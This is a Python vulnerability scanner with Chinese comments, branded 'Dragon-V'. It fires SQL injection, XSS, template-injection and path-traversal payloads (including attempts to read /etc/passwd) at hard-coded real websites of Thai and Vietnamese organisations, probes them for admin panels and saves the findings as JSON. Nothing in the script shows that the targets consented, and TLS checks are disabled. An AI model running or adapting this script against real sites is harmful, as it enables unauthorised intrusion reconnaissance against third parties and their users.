#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
快速严重漏洞测试工具
Quick Critical Vulnerability Test

针对发现的CRITICAL级别漏洞进行快速测试
"""

import requests
import json
import re
from datetime import datetime
from urllib.parse import urljoin

class QuickCriticalTest:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
        })

        # CRITICAL级别目标
        self.critical_targets = [
            {"name": "Thaivivat", "url": "https://thaivivat.co.th", "priority": "CRITICAL"},
            {"name": "CM Cooperative", "url": "https://cmcoop.or.th", "priority": "CRITICAL"},
            {"name": "Mun Saving", "url": "https://munsaving.com", "priority": "CRITICAL"},
            {"name": "VN Post", "url": "https://vnpost.vn", "priority": "HIGH"}
        ]

    def test_sql_injection(self, url):
        """SQL注入快速测试"""
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1--",
            "' AND 1=1--"
        ]

        results = []
        for payload in sql_payloads:
            try:
                response = self.session.get(url, params={"id": payload}, timeout=10, verify=False)
                sql_errors = [
                    "sql syntax", "mysql", "postgresql", "ora-",
                    "microsoft ole db", "error in your sql syntax"
                ]

                if any(error in response.text.lower() for error in sql_errors):
                    results.append({
                        "vulnerable": True,
                        "payload": payload,
                        "status_code": response.status_code
                    })
            except:
                pass
        return results

    def test_error_disclosure(self, url):
        """错误披露快速测试"""
        error_payloads = [
            "' OR 1=1--",
            "<script>alert('XSS')</script>",
            "{{7*7}}"
        ]

        results = []
        for payload in error_payloads:
            try:
                response = self.session.get(url, params={"q": payload}, timeout=10, verify=False)

                error_indicators = [
                    "mysql", "fatal error", "exception", "traceback",
                    "sql server", "postgresql", "oracle"
                ]

                if any(error in response.text.lower() for error in error_indicators):
                    results.append({
                        "vulnerable": True,
                        "payload": payload,
                        "status_code": response.status_code
                    })
            except:
                pass
        return results

    def test_path_traversal(self, url):
        """路径遍历快速测试"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]

        results = []
        for payload in traversal_payloads:
            try:
                response = self.session.get(url, params={"file": payload}, timeout=10, verify=False)

                file_indicators = ["root:", "daemon:", "bin:", "sys:", "hosts", "localhost"]

                if any(indicator in response.text for indicator in file_indicators):
                    results.append({
                        "vulnerable": True,
                        "payload": payload,
                        "status_code": response.status_code
                    })
            except:
                pass
        return results

    def test_admin_panel(self, url):
        """管理面板快速测试"""
        admin_paths = ["/admin", "/administrator", "/wp-admin", "/phpmyadmin"]

        results = []
        for path in admin_paths:
            full_url = urljoin(url, path)
            try:
                response = self.session.get(full_url, timeout=10, verify=False)
                if response.status_code == 200 and ("login" in response.text.lower() or "admin" in response.text.lower()):
                    results.append({
                        "vulnerable": True,
                        "path": path,
                        "status_code": response.status_code
                    })
            except:
                pass
        return results

    def run_quick_test(self):
        """运行快速测试"""
        print("=" * 50)
        print("快速严重漏洞测试")
        print("Quick Critical Vulnerability Test")
        print("=" * 50)

        test_results = []

        for target in self.critical_targets:
            print(f"\n[TEST] {target['name']} ({target['url']})")
            print(f"优先级: {target['priority']}")

            target_result = {
                "name": target['name'],
                "url": target['url'],
                "priority": target['priority'],
                "tests": {}
            }

            # SQL注入测试
            print("  [1] SQL注入测试...")
            sql_results = self.test_sql_injection(target['url'])
            target_result["tests"]["sql_injection"] = sql_results
            if sql_results:
                print(f"    [!] 发现SQL注入漏洞: {len(sql_results)}个")

            # 错误披露测试
            print("  [2] 错误披露测试...")
            error_results = self.test_error_disclosure(target['url'])
            target_result["tests"]["error_disclosure"] = error_results
            if error_results:
                print(f"    [!] 发现错误披露漏洞: {len(error_results)}个")

            # 路径遍历测试
            print("  [3] 路径遍历测试...")
            traversal_results = self.test_path_traversal(target['url'])
            target_result["tests"]["path_traversal"] = traversal_results
            if traversal_results:
                print(f"    [!] 发现路径遍历漏洞: {len(traversal_results)}个")

            # 管理面板测试
            print("  [4] 管理面板测试...")
            admin_results = self.test_admin_panel(target['url'])
            target_result["tests"]["admin_panel"] = admin_results
            if admin_results:
                print(f"    [!] 发现管理面板: {len(admin_results)}个")

            # 统计漏洞总数
            total_vulnerabilities = sum(len(results) for results in target_result["tests"].values())
            target_result["total_vulnerabilities"] = total_vulnerabilities
            target_result["risk_level"] = "CRITICAL" if total_vulnerabilities >= 2 else "HIGH" if total_vulnerabilities >= 1 else "LOW"

            test_results.append(target_result)
            print(f"  [RESULT] 总漏洞数: {total_vulnerabilities}, 风险等级: {target_result['risk_level']}")

        return test_results

    def generate_report(self, results):
        """生成报告"""
        print("\n" + "=" * 50)
        print("快速严重漏洞测试报告")
        print("Quick Critical Test Report")
        print("=" * 50)

        total_targets = len(results)
        total_vulnerabilities = sum(target["total_vulnerabilities"] for target in results)
        critical_targets = len([t for t in results if t["risk_level"] == "CRITICAL"])
        high_targets = len([t for t in results if t["risk_level"] == "HIGH"])

        print(f"测试目标总数: {total_targets}")
        print(f"总漏洞发现数: {total_vulnerabilities}")
        print(f"CRITICAL级别目标: {critical_targets}")
        print(f"HIGH级别目标: {high_targets}")

        for target in results:
            print(f"\n目标: {target['name']} ({target['url']})")
            print(f"风险等级: {target['risk_level']}")
            print(f"漏洞总数: {target['total_vulnerabilities']}")

            for test_name, test_results in target["tests"].items():
                if test_results:
                    print(f"  {test_name}:")
                    for result in test_results[:2]:  # 显示前2个结果
                        if result.get("vulnerable"):
                            print(f"    [!] 漏洞确认")

        return {
            "timestamp": datetime.now().isoformat(),
            "total_targets": total_targets,
            "total_vulnerabilities": total_vulnerabilities,
            "critical_targets": critical_targets,
            "high_targets": high_targets,
            "results": results
        }

def main():
    """主函数"""
    print("Dragon-V Quick Critical Vulnerability Tester")
    print("快速严重漏洞测试工具")

    tester = QuickCriticalTest()
    results = tester.run_quick_test()
    report_data = tester.generate_report(results)

    # 保存结果
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_filename = f"quick_critical_test_{timestamp}.json"

    try:
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        print(f"\n[SUCCESS] 结果已保存: {json_filename}")
    except Exception as e:
        print(f"[ERROR] 保存失败: {e}")

if __name__ == "__main__":
    main()